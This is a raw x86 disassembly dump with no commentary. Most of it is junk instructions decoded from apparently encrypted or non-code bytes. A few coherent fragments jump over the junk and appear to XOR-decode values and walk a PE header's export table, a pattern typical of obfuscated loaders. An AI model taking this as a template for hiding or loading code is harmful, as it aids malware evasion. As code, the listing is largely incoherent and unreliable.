  40bd51:	xlat   BYTE PTR ds:[ebx]
  40bd52:	ds sbb eax,0x6618e06
  40bd58:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40bd5a:	cdq    
  40bd5b:	imul   edx,DWORD PTR [ebp+ebp*8-0x70],0xfffffff6
  40bd60:	jns    0x40bd7b
  40bd62:	push   ecx
  40bd63:	dec    ecx
  40bd64:	sub    eax,0xbed7d92
  40bd69:	mov    dl,0x19
  40bd6b:	xchg   esi,eax
  40bd6c:	aam    0x63
  40bd6e:	lahf   
  40bd6f:	aam    0x55
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz and BYTE PTR [ebp-0x34657c6],0x7e
  40bd92:	jle    0x40bdc2
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bde2
  40bd98:	or     eax,0x6ac46173
  40bd9d:	inc    eax
  40bd9e:	mov    edx,0x557b87c1
  40bda3:	dec    esp
  40bda4:	or     eax,0x7814f8b6
  40bda9:	imul   ebx,DWORD PTR [ecx-0x335a9c12],0xfffffff6
  40bdb0:	lods   eax,DWORD PTR ds:[esi]
  40bdb1:	xchg   edi,eax
  40bdb2:	mov    WORD PTR [ebx],?
  40bdb4:	add    dh,cl
  40bdb6:	test   DWORD PTR [eax-0xc3a1459],eax
  40bdbc:	push   ebx
  40bdbd:	fisub  DWORD PTR [ecx+0x1537fa1]
  40bdc3:	sub    bl,ah
  40bdc5:	repz push cs
  40bdc7:	int3   
  40bdc8:	xor    al,0xe1
  40bdca:	sar    dl,cl
  40bdcc:	aam    0x82
  40bdce:	(bad)  
  40bdcf:	adc    eax,0x2aa18bde
  40bdd4:	dec    edi
  40bdd5:	or     BYTE PTR gs:[eax-0x17],cl
  40bdd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdda:	fidiv  WORD PTR [bx+di-0x56]
  40bdde:	pushf  
  40bddf:	(bad)  
  40bde0:	pop    edi
  40bde1:	dec    edx
  40bde2:	push   eax
  40bde3:	sub    DWORD PTR [ecx-0x43],edx
  40bde6:	sar    BYTE PTR [eax-0x14796c73],cl
  40bdec:	lods   al,BYTE PTR ds:[esi]
  40bded:	jb     0x40bdae
  40bdef:	cmp    ebp,DWORD PTR [esi-0x3ef8bf53]
  40bdf5:	jge    0x40be55
  40bdf7:	mov    eax,DWORD PTR [ebp-0x1f]
  40bdfa:	out    dx,eax
  40bdfb:	pop    edi
  40bdfc:	jmp    esp
  40bdfe:	out    0xce,eax
  40be00:	mov    dl,0xca
  40be02:	sub    eax,0x5d5ddb45
  40be07:	add    cl,BYTE PTR [ebx]
  40be09:	xchg   ebp,eax
  40be0a:	push   ebx
  40be0b:	and    al,BYTE PTR [ecx+ecx*4]
  40be0e:	cld    
  40be0f:	push   ebp
  40be10:	inc    eax
  40be11:	mov    DWORD PTR [ecx-0x50],ecx
  40be14:	je     0x40bdff
  40be16:	scas   al,BYTE PTR es:[edi]
  40be17:	test   ebx,ebp
  40be19:	repz push ss
  40be1b:	or     al,0xaa
  40be1d:	lds    ebx,FWORD PTR [edx]
  40be1f:	popf   
  40be20:	fcmovnbe st,st(3)
  40be22:	js     0x40be6f
  40be24:	sub    edx,esi
  40be26:	test   ecx,edx
  40be28:	imul   eax,DWORD PTR [edx-0x17dbc888],0x9f884371
  40be32:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be34:	imul   ebx,ecx,0x34036bf
  40be3a:	xchg   esp,eax
  40be3b:	into   
  40be3c:	xor    DWORD PTR [ebx+edx*2+0x9],ebx
  40be40:	inc    edi
  40be41:	pop    ebp
  40be42:	test   DWORD PTR [eax+0x758ec73f],edi
  40be48:	xor    DWORD PTR [eax-0x452a1207],edi
  40be4e:	dec    esi
  40be4f:	aaa    
  40be50:	or     al,0x25
  40be52:	pop    es
  40be53:	and    eax,DWORD PTR [eax]
  40be55:	jle    0x40be4a
  40be57:	push   edx
  40be58:	push   edx
  40be59:	stos   DWORD PTR es:[edi],eax
  40be5a:	mov    edx,0x9d0e4e77
  40be5f:	stos   DWORD PTR es:[edi],eax
  40be60:	adc    edi,DWORD PTR [esi]
  40be62:	push   cs
  40be63:	push   0xe48e412e
  40be68:	xor    edi,edi
  40be6a:	js     0x40bdf0
  40be6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be6d:	mov    DWORD PTR [ebp+0xd],ebx
  40be70:	retf   0x5376
  40be73:	arpl   WORD PTR [esi],si
  40be75:	xlat   BYTE PTR ds:[ebx]
  40be76:	jmp    0xc0727a1
  40be7b:	mov    al,0x5f
  40be7d:	aaa    
  40be7e:	sub    eax,0x287f00f7
  40be83:	sub    esp,DWORD PTR [edx+edi*8-0xea2739]
  40be8a:	fwait
  40be8b:	ret    0xdcf
  40be8e:	fnstenv [edi+0x59c37333]
  40be94:	add    eax,0xf92d768d
  40be99:	ins    DWORD PTR es:[edi],dx
  40be9a:	in     eax,0x43
  40be9c:	cwde   
  40be9d:	sbb    BYTE PTR [edx+0x53],0x9c
  40bea1:	sub    DWORD PTR [ebx-0x12de6875],esp
  40bea7:	mov    eax,esi
  40bea9:	adc    al,BYTE PTR [edi+0x232dce77]
  40beaf:	out    dx,al
  40beb0:	ins    BYTE PTR es:[edi],dx
  40beb1:	sbb    eax,0x45710647
  40beb6:	ins    BYTE PTR es:[edi],dx
  40beb7:	stos   BYTE PTR es:[edi],al
  40beb8:	fs push es
  40beba:	int3   
  40bebb:	loop   0x40bea4
  40bebd:	jge    0x40bf3e
  40bebf:	fmulp  st(3),st
  40bec1:	dec    esp
  40bec2:	imul   edi,DWORD PTR [esi+ebp*1],0xa2898629
  40bec9:	aad    0x69
  40becb:	xlat   BYTE PTR ds:[ebx]
  40becc:	xchg   ebx,eax
  40becd:	dec    esp
  40bece:	sub    DWORD PTR [ecx+0x27],ecx
  40bed1:	mov    dh,0x19
  40bed3:	(bad)  
  40bed4:	dec    ebp
  40bed5:	inc    ecx
  40bed6:	xor    al,0x97
  40bed8:	pop    ebx
  40bed9:	rol    bl,0xc
  40bedc:	dec    ecx
  40bedd:	inc    ebx
  40bede:	sbb    eax,DWORD PTR [esi]
  40bee0:	mov    ds:0x3dd4fd93,al
  40bee5:	das    
  40bee6:	jmp    0x40bed0
  40bee8:	push   es
  40bee9:	sub    ebp,esp
  40beeb:	pop    ecx
  40beec:	mov    esi,0x752a72e4
  40bef1:	sbb    bh,BYTE PTR [edi]
  40bef3:	push   eax
  40bef4:	or     eax,0x835088b2
  40bef9:	add    esp,DWORD PTR [esi+0x7e]
  40befc:	int    0x10
  40befe:	xchg   edx,eax
  40beff:	retf   0x10f1
  40bf02:	dec    ecx
  40bf03:	push   edx
  40bf04:	fs push ebp
  40bf06:	daa    
  40bf07:	outs   dx,DWORD PTR ds:[esi]
  40bf08:	adc    ebp,0x626053cc
  40bf0e:	dec    edx
  40bf0f:	fst    DWORD PTR [esi-0x2e]
  40bf12:	inc    ebp
  40bf13:	sub    eax,0xd1ab41fb
  40bf18:	popf   
  40bf19:	fwait
  40bf1a:	imul   eax,esp,0x65430b61
  40bf20:	outs   dx,DWORD PTR ds:[esi]
  40bf21:	sub    BYTE PTR [edi+eax*1+0x575a66cd],cl
  40bf28:	ja     0x40bf35
  40bf2a:	and    ebx,esp
  40bf2c:	imul   ecx,DWORD PTR [ebx],0xc9734ea5
  40bf32:	mov    bl,0x9e
  40bf34:	mov    ecx,0x30fbc13f
  40bf39:	rcl    BYTE PTR [edx-0x6f360a19],cl
  40bf3f:	popf   
  40bf40:	cmp    ch,BYTE PTR [edi]
  40bf42:	push   ss
  40bf43:	and    dh,BYTE PTR [edx-0x3b5b244c]
  40bf49:	mov    ds:0x14ae03f0,eax
  40bf4e:	inc    edx
  40bf4f:	xchg   ebp,eax
  40bf50:	pop    es
  40bf51:	mov    dl,0xaf
  40bf53:	push   eax
  40bf54:	push   edi
  40bf55:	sar    BYTE PTR [ebx+esi*1],1
  40bf58:	mov    eax,ds:0xada678d3
  40bf5d:	icebp  
  40bf5e:	and    ebp,DWORD PTR [edx-0x34]
  40bf61:	jl     0x40bf56
  40bf63:	jmp    0x71bcc46b
  40bf68:	cmp    ebp,DWORD PTR [eax+0x26]
  40bf6b:	push   ecx
  40bf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf6d:	dec    ebp
  40bf6e:	sti    
  40bf6f:	mov    eax,ds:0xfc2cdbff
  40bf74:	pop    eax
  40bf75:	pop    edx
  40bf76:	adc    dl,ch
  40bf78:	mov    esp,0xa72fe493
  40bf7d:	xchg   ebx,eax
  40bf7e:	sub    DWORD PTR [edi-0x52e51e8d],edi
  40bf84:	pop    ss
  40bf85:	push   0x3a96e79e
  40bf8a:	mov    BYTE PTR [ebp-0x5b],bl
  40bf8d:	aaa    
  40bf8e:	icebp  
  40bf8f:	pop    ss
  40bf90:	scas   al,BYTE PTR es:[edi]
  40bf91:	cld    
  40bf92:	mov    ah,0xc3
  40bf94:	xor    al,0xe
  40bf96:	mov    ecx,0x5cfe89c5
  40bf9b:	int3   
  40bf9c:	loopne 0x40bf27
  40bf9e:	mov    ecx,0xb3b02ae5
  40bfa3:	sbb    DWORD PTR [ecx+0x56aed8fa],ebp
  40bfa9:	pop    esi
  40bfaa:	nop
  40bfab:	scas   al,BYTE PTR es:[edi]
  40bfac:	pop    DWORD PTR [esi]
  40bfae:	lds    eax,FWORD PTR [eax+0x31]
  40bfb1:	cmp    bl,dl
  40bfb3:	in     eax,dx
  40bfb4:	test   BYTE PTR [eax+0x1c7c20ee],ah
  40bfba:	sub    eax,0x3cbc3244
  40bfbf:	out    0xf5,eax
  40bfc1:	mov    eax,ds:0x3e6af815
  40bfc6:	(bad)  
  40bfc7:	jmp    0x145f:0xb648f5ec
  40bfce:	in     al,dx
  40bfcf:	js     0x40bfe8
  40bfd1:	pop    edx
  40bfd2:	pusha  
  40bfd3:	adc    BYTE PTR [edx-0x6efac79d],0x33
  40bfda:	loope  0x40bfcd
  40bfdc:	imul   esp,DWORD PTR ds:0x3b46daaa,0xd212b7df
  40bfe6:	aad    0x56
  40bfe8:	ficomp WORD PTR [edx-0x6]
  40bfeb:	dec    edx
  40bfec:	inc    edi
  40bfed:	lea    esp,[edx]
  40bfef:	sbb    ah,bl
  40bff1:	lahf   
  40bff2:	mov    gs,WORD PTR [esp+ebp*8]
  40bff5:	or     esp,edx
  40bff7:	and    al,bh
  40bff9:	hlt    
  40bffa:	cmp    al,0x45
  40bffc:	jns    0x40bfb4
  40bffe:	fsubr  QWORD PTR [edx-0x780fc93b]
  40c004:	clc    
  40c005:	hlt    
  40c006:	push   esp
  40c007:	inc    eax
  40c008:	and    al,0x37
  40c00a:	or     ah,dh
  40c00c:	dec    esi
  40c00d:	cmp    edx,DWORD PTR [ebp-0x25e965c0]
  40c013:	push   esi
  40c014:	cdq    
  40c015:	fdivr  QWORD PTR [ecx-0x5c]
  40c018:	fnstsw WORD PTR [edx-0x46d76bd9]
  40c01e:	add    al,0x92
  40c020:	pop    ss
  40c021:	clc    
  40c022:	clc    
  40c023:	clc    
  40c024:	add    BYTE PTR [esi-0x4b7c1cab],bh
  40c02a:	mov    dh,0xd6
  40c02c:	adc    DWORD PTR [edi+0x1e],esi
  40c02f:	xlat   BYTE PTR ds:[ebx]
  40c030:	push   esi
  40c031:	rol    bh,cl
  40c033:	jno    0x40c050
  40c035:	stos   DWORD PTR es:[edi],eax
  40c036:	dec    eax
  40c037:	aaa    
  40c038:	jp     0x40c049
  40c03a:	push   edi
  40c03b:	jg     0x40c066
  40c03d:	test   BYTE PTR [ecx+0x5d],cl
  40c040:	sub    dh,BYTE PTR [esi]
  40c042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c043:	je     0x40c015
  40c045:	fs mov ah,0x70
  40c048:	sbb    esp,esi
  40c04a:	imul   ebx,DWORD PTR [ecx-0x53],0xffffffbc
  40c04e:	push   0xe76e0b6a
  40c053:	xchg   edi,eax
  40c054:	mov    dl,0xe3
  40c056:	fs xchg ebp,eax
  40c058:	jbe    0x40c0bc
  40c05a:	inc    ebp
  40c05b:	hlt    
  40c05c:	ins    BYTE PTR es:[edi],dx
  40c05d:	and    DWORD PTR [ebx-0xc],0x52
  40c061:	(bad)  
  40c062:	mov    ah,bh
  40c064:	inc    esp
  40c065:	fbstp  TBYTE PTR [ecx]
  40c067:	std    
  40c068:	add    eax,0xc0c7119
  40c06d:	inc    edx
  40c06e:	push   esp
  40c06f:	ss cwde 
  40c071:	mov    eax,ds:0xb13dec11
  40c076:	fs pop es
  40c078:	popf   
  40c079:	addr16 mov ?,edx
  40c07c:	xchg   esi,eax
  40c07d:	mov    ch,0xe7
  40c07f:	repz out dx,al
  40c081:	call   FWORD PTR [eax+esi*8]
  40c084:	ins    DWORD PTR es:[edi],dx
  40c085:	pop    edi
  40c086:	es push esp
  40c088:	ins    DWORD PTR es:[edi],dx
  40c089:	test   eax,0xe2238806
  40c08e:	outs   dx,BYTE PTR ds:[esi]
  40c08f:	inc    esp
  40c090:	icebp  
  40c091:	push   eax
  40c092:	cdq    
  40c093:	aad    0x1a
  40c095:	and    BYTE PTR [edx+0x2f129a77],dh
  40c09b:	or     ecx,esp
  40c09d:	mov    al,ds:0xa0dce561
  40c0a2:	std    
  40c0a3:	arpl   WORD PTR [edi-0x1930d952],bx
  40c0a9:	mov    ebx,0x8c8bb813
  40c0ae:	push   0x4f538f7c
  40c0b3:	int    0xad
  40c0b5:	jae    0x40c108
  40c0b7:	les    ecx,FWORD PTR [edi-0x10]
  40c0ba:	sub    BYTE PTR [edx+0x608275d7],dh
  40c0c0:	in     al,0x6c
  40c0c2:	lock jle 0x40c13d
  40c0c5:	jmp    FWORD PTR fs:[ebx]
  40c0c8:	enter  0x8b66,0x45
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	int3   
  40c104:	jp     0x40c10a
  40c106:	or     ch,BYTE PTR [ecx-0x5]
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0a7
  40c110:	xor    DWORD PTR [esi+0x4baeb1ef],esp
  40c116:	inc    edi
  40c117:	fistp  WORD PTR [ecx+0x34458754]
  40c11d:	lods   al,BYTE PTR ds:[esi]
  40c11e:	shr    BYTE PTR [esi+0x3b],0x3d
  40c122:	xchg   esp,eax
  40c123:	sub    bh,ah
  40c125:	in     eax,dx
  40c126:	aaa    
  40c127:	mov    dl,0x79
  40c129:	fucomp st(7)
  40c12b:	mov    ebp,DWORD PTR ds:0x8dc66c6e
  40c131:	cmp    eax,0xa16cef97
  40c136:	sbb    eax,0xe2938365
  40c13b:	dec    esp
  40c13c:	aam    0xa9
  40c13e:	mov    ?,edx
  40c140:	ins    DWORD PTR es:[edi],dx
  40c141:	mov    esp,0x51c3ecb3
  40c146:	(bad)  
  40c147:	or     eax,0x8155e649
  40c14c:	in     al,0x4a
  40c14e:	aaa    
  40c14f:	push   eax
  40c150:	nop
  40c151:	sub    esi,DWORD PTR [ebx-0x137d9c58]
  40c157:	es leave 
  40c159:	sar    BYTE PTR [ebx],0x32
  40c15c:	(bad)  
  40c15d:	int    0x88
  40c15f:	enter  0x4c70,0x7d
  40c163:	gs icebp 
  40c165:	dec    esi
  40c166:	shr    ebx,1
  40c168:	dec    edx
  40c169:	test   BYTE PTR [ebx+0x737f321e],ah
  40c16f:	xchg   ecx,eax
  40c170:	push   eax
  40c171:	sahf   
  40c172:	pushw  cs
  40c174:	repz repnz pop edx
  40c177:	std    
  40c178:	adc    DWORD PTR [ebp+0x6e79451a],0x6072cbd3
  40c182:	jno    0x40c151
  40c184:	mov    ebp,0x3d8d7f96
  40c189:	sbb    DWORD PTR gs:[ecx+edi*4-0x57],0xa6f2bb9a
  40c192:	sbb    cl,bl
  40c194:	inc    ebx
  40c195:	inc    DWORD PTR [edx]
  40c197:	mov    al,0x4e
  40c199:	jg     0x40c20e
  40c19b:	stos   DWORD PTR es:[edi],eax
  40c19c:	out    dx,al
  40c19d:	inc    esi
  40c19e:	xchg   esp,eax
  40c19f:	or     al,0x83
  40c1a1:	inc    esi
  40c1a2:	lods   al,BYTE PTR ds:[esi]
  40c1a3:	adc    al,0xc0
  40c1a5:	cdq    
  40c1a6:	imul   esi,DWORD PTR [eax+edi*8-0x14a66309],0x50
  40c1ae:	sbb    ebx,ebx
  40c1b0:	fcmovbe st,st(0)
  40c1b2:	mov    al,ds:0x3f5136eb
  40c1b7:	enter  0x75ae,0x5e
  40c1bb:	inc    ebp
  40c1bc:	jns    0x40c18d
  40c1be:	retf   0xf048
  40c1c1:	(bad)  
  40c1c2:	in     al,0xb3
  40c1c4:	inc    ebx
  40c1c5:	adc    al,BYTE PTR [eax-0xa]
  40c1c8:	ret    
  40c1c9:	out    dx,al
  40c1ca:	mov    eax,0x8b9d10a0
  40c1cf:	push   ebx
  40c1d0:	push   ss
  40c1d1:	mov    dh,0xf4
  40c1d3:	jmp    0xf58:0xbfb8283e
  40c1da:	fucomip st,st(1)
  40c1dc:	or     edi,edx
  40c1de:	pop    ebx
  40c1df:	mov    edi,0x387162ed
  40c1e4:	add    al,0x41
  40c1e6:	pop    eax
  40c1e7:	in     eax,0x99
  40c1e9:	out    dx,al
  40c1ea:	push   ss
  40c1eb:	push   cs
  40c1ec:	arpl   WORD PTR [edi],di
  40c1ee:	adc    BYTE PTR [edi],bh
  40c1f0:	lock add eax,0x6c948d61
  40c1f6:	adc    DWORD PTR [ecx],0x15
  40c1f9:	push   ebx
  40c1fa:	inc    edi
  40c1fb:	xchg   ebp,eax
  40c1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fd:	mov    eax,DWORD PTR [ecx]
  40c1ff:	cmp    eax,0x2904e124
  40c204:	js     0x40c239
  40c206:	add    ebp,DWORD PTR [eax]
  40c208:	nop
  40c209:	jne    0x40c219
  40c20b:	ins    DWORD PTR es:[edi],dx
  40c20c:	adc    al,0xcc
  40c20e:	outs   dx,DWORD PTR ds:[esi]
  40c20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c210:	push   ds
  40c211:	sti    
  40c212:	mov    ebp,0x3b16ac08
  40c217:	jae    0x40c20a
  40c219:	pusha  
  40c21a:	aam    0xff
  40c21c:	mov    ebp,0x222050e1
  40c221:	fisub  WORD PTR [ebx+0x57d491ca]
  40c227:	cmp    BYTE PTR [eax+ecx*1-0x58cb8902],bl
  40c22e:	jbe    0x40c289
  40c230:	and    al,0x6f
  40c232:	imul   ecx,DWORD PTR [ecx+0x635c2565],0x35
  40c239:	adc    al,0xc
  40c23b:	pop    ebx
  40c23c:	sub    eax,0xcd5d7466
  40c241:	lods   eax,DWORD PTR ds:[esi]
  40c242:	mov    edx,0x1c8101da
  40c247:	xchg   DWORD PTR [ecx],eax
  40c249:	in     eax,0x94
  40c24b:	es push edx
  40c24d:	pop    ecx
  40c24e:	push   ds
  40c24f:	fild   WORD PTR [esi+eax*2]
  40c252:	cmp    esp,DWORD PTR [ebx+0x227fea90]
  40c258:	pusha  
  40c259:	and    BYTE PTR [ecx+0xf],bl
  40c25c:	bound  edx,QWORD PTR [ecx]
  40c25e:	repnz dec ebp
  40c260:	dec    ecx
  40c261:	fdiv   DWORD PTR [esi+0x12b9621b]
  40c267:	pop    esp
  40c268:	sbb    BYTE PTR [edi+0x6dc088e3],ah
  40c26e:	push   ecx
  40c26f:	push   esi
  40c270:	jp     0x40c277
  40c272:	stos   DWORD PTR es:[edi],eax
  40c273:	cli    
  40c274:	ret    
  40c275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c276:	les    esp,FWORD PTR [esi-0x69]
  40c279:	scas   eax,DWORD PTR es:[edi]
  40c27a:	pop    es
  40c27b:	int3   
  40c27c:	enter  0x905e,0x93
  40c280:	inc    ebx
  40c281:	inc    edi
  40c282:	jp     0x40c294
  40c284:	rol    DWORD PTR [edx-0x6eb24604],cl
  40c28a:	je     0x40c229
  40c28c:	push   ecx
  40c28d:	mov    es,WORD PTR [ecx+0x10ef5de3]
  40c293:	push   cs
  40c294:	jb     0x40c29f
  40c296:	mov    ah,0xb9
  40c298:	mov    edi,0xed6adf8d
  40c29d:	add    BYTE PTR [ebp+0x6a56ef70],dl
  40c2a3:	test   DWORD PTR [eax-0x2b],eax
  40c2a6:	addr16 inc esp
  40c2a8:	push   ss
  40c2a9:	cmp    ecx,eax
  40c2ab:	adc    eax,0x93352379
  40c2b0:	jmp    0x832c:0x76edc482
  40c2b7:	iret   
  40c2b8:	add    esp,edx
  40c2ba:	jne    0x40c2d4
  40c2bc:	mov    ah,0x76
  40c2be:	test   ecx,0x1bcb6125
  40c2c4:	std    
  40c2c5:	lods   al,BYTE PTR ds:[esi]
  40c2c6:	and    ah,cl
  40c2c8:	cmc    
  40c2c9:	not    esi
  40c2cb:	loopne 0x40c311
  40c2cd:	mov    edi,0x8c2b15d6
  40c2d2:	pop    edi
  40c2d3:	sbb    BYTE PTR [edx-0x75],cl
  40c2d6:	and    esi,esi
  40c2d8:	mov    dl,0x88
  40c2da:	cmp    eax,0x6e61a179
  40c2df:	data16 test BYTE PTR [eax+0x69892dfd],ah
  40c2e6:	data16 loop 0x40c357
  40c2e9:	js     0x40c2de
  40c2eb:	jns    0x40c2fb
  40c2ed:	stos   DWORD PTR es:[edi],eax
  40c2ee:	in     eax,0x48
  40c2f0:	jl     0x40c33f
  40c2f2:	scas   al,BYTE PTR es:[edi]
  40c2f3:	fbstp  TBYTE PTR [edx+0x2c]
  40c2f6:	cmp    dl,BYTE PTR [ecx+0x52]
  40c2f9:	sub    eax,0x117d5390
  40c2fe:	enter  0x8409,0xd0
  40c302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c303:	lods   eax,DWORD PTR ds:[esi]
  40c304:	imul   esi,DWORD PTR [ecx],0x20
  40c307:	outs   dx,DWORD PTR ds:[esi]
  40c308:	push   ebp
  40c309:	cdq    
  40c30a:	add    al,dh
  40c30c:	mov    esp,0x30702edd
  40c311:	inc    eax
  40c312:	sbb    ebx,DWORD PTR [eax]
  40c314:	out    dx,al
  40c315:	pop    ecx
  40c316:	mov    al,0x2c
  40c318:	loopne 0x40c2a9
  40c31a:	cmp    al,0x6a
  40c31c:	pop    ebx
  40c31d:	dec    edx
  40c31e:	adc    al,0x84
  40c320:	push   ebp
  40c321:	dec    edi
  40c322:	jle    0x40c386
  40c324:	dec    ebp
  40c325:	add    DWORD PTR [esi+esi*2],ebx
  40c328:	bound  ebp,QWORD PTR [eax-0x6d88ff72]
  40c32e:	jno    0x40c325
  40c330:	xchg   edx,eax
  40c331:	push   eax
  40c332:	mov    dl,BYTE PTR [ecx+edi*1+0x26]
  40c336:	gs call 0xf3bd9b08
  40c33c:	mov    ecx,0x5a152811
  40c341:	shl    DWORD PTR [ebp+ebp*8+0x3b4b4ddc],0xa
  40c349:	popf   
  40c34a:	pop    ds
  40c34b:	adc    bh,BYTE PTR [ecx]
  40c34d:	xor    al,0x88
  40c34f:	xor    eax,DWORD PTR [si]
  40c352:	fnstcw WORD PTR [ecx]
  40c354:	mov    esp,0x1f72b4cc
  40c359:	pop    eax
  40c35a:	push   edi
  40c35b:	es pop edx
  40c35d:	mov    ds:0xf94be961,al
  40c362:	dec    ecx
  40c363:	and    BYTE PTR [ebp-0x404aa22c],0x71
  40c36a:	dec    esp
  40c36b:	or     bl,BYTE PTR [eax-0x2d]
  40c36e:	hlt    
  40c36f:	fcom   QWORD PTR [ecx+0x55]
  40c372:	ins    BYTE PTR es:[edi],dx
  40c373:	push   eax
  40c374:	xchg   esi,eax
  40c375:	pop    ds
  40c376:	idiv   BYTE PTR [eax+0x532288c9]
  40c37c:	js     0x40c3dc
  40c37e:	loope  0x40c394
  40c380:	fistp  WORD PTR [ebp+0x1c]
  40c383:	in     eax,dx
  40c384:	pusha  
  40c385:	push   edx
  40c386:	xchg   ebx,ebp
  40c388:	jae    0x40c367
  40c38a:	xchg   ebp,eax
  40c38b:	adc    ecx,esp
  40c38d:	and    DWORD PTR [ebp-0x3],esp
  40c390:	mov    esi,esp
  40c392:	call   0xd231218f
  40c397:	xor    DWORD PTR [ebp-0x68],ecx
  40c39a:	inc    edx
  40c39b:	adc    esi,DWORD PTR [edx+0x6b]
  40c39e:	pop    ebp
  40c39f:	mov    bh,0xb
  40c3a1:	fwait
  40c3a2:	sbb    esp,DWORD PTR [ebx-0xe]
  40c3a5:	cmp    cl,ah
  40c3a7:	mov    edx,0x64c810f2
  40c3ac:	das    
  40c3ad:	inc    ebp
  40c3ae:	pop    edi
  40c3af:	loop   0x40c35c
  40c3b1:	sbb    al,0xe8
  40c3b3:	ficom  WORD PTR [ebp+0x177ecb22]
  40c3b9:	mov    DWORD PTR [ebp-0x19a3d82f],0x111d02a
  40c3c3:	vpand  xmm6,xmm4,XMMWORD PTR [edi+0x20ac0da4]
  40c3cb:	neg    DWORD PTR [eax+0x47]
  40c3ce:	bound  ebp,QWORD PTR [esi]
  40c3d0:	lea    eax,[eax-0x479c58e2]
  40c3d6:	sbb    BYTE PTR [ebx+0x3f025fd2],dh
  40c3dc:	pop    eax
  40c3dd:	mov    ds:0xe940913,eax
  40c3e2:	fimul  WORD PTR [esp+edx*1-0x38]
  40c3e6:	pusha  
  40c3e7:	test   bl,bl
  40c3e9:	out    dx,eax
  40c3ea:	out    0x7b,eax
  40c3ec:	mov    ah,0x70
  40c3ee:	mov    edx,0x8583037f
  40c3f3:	mov    al,0xde
  40c3f5:	mov    al,ds:0x3814cd77
  40c3fa:	lock (bad) 
  40c3fc:	clc    
  40c3fd:	fistp  WORD PTR [ebx+0x1587bfe2]
  40c403:	mov    eax,ds:0xa9737bcf
  40c408:	pop    ss
  40c409:	cs int3 
  40c40b:	shr    ebx,0x89
  40c40e:	dec    eax
  40c40f:	sbb    DWORD PTR [ecx],esi
  40c411:	outs   dx,BYTE PTR ds:[esi]
  40c412:	inc    edi
  40c413:	cs aad 0x24
  40c416:	out    dx,eax
  40c417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c418:	sahf   
  40c419:	call   DWORD PTR [ecx-0x1762c0b0]
  40c41f:	(bad)  ds:0x592eb2fc
  40c425:	outs   dx,BYTE PTR ds:[esi]
  40c426:	xor    eax,0x4f27b37d
  40c42b:	inc    esi
  40c42c:	xlat   BYTE PTR ds:[ebx]
  40c42d:	dec    ebp
  40c42e:	lds    edi,FWORD PTR [ebx+eax*1]
  40c431:	loopne 0x40c3d9
  40c433:	mov    al,0x95
  40c435:	sub    BYTE PTR [esi-0x255adce7],ah
  40c43b:	push   edi
  40c43c:	mov    WORD PTR [edi+0x25],ss
  40c43f:	lea    eax,[eax+ecx*1+0x32729b]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x18]
  40c49b:	push   esp
  40c49c:	addr16 push ebx
  40c49e:	sbb    DWORD PTR [edi+0x7d2e7e7e],eax
  40c4a4:	jle    0x40c524
  40c4a6:	jbe    0x40c45d
  40c4a8:	jle    0x40c435
  40c4aa:	sar    BYTE PTR [ebx-0x6561138e],0xf8
  40c4b1:	stos   BYTE PTR es:[edi],al
  40c4b2:	js     0x40c50b
  40c4b4:	xor    DWORD PTR [edi*2-0x1310c62],ebp
  40c4bb:	call   0x5d881486
  40c4c0:	sub    dl,dl
  40c4c2:	dec    ebp
  40c4c3:	inc    ebx
  40c4c4:	xor    BYTE PTR [eax+0x41],0xd6
  40c4c8:	adc    eax,0x87b40fdd
  40c4cd:	test   DWORD PTR [eax],ecx
  40c4cf:	dec    ebx
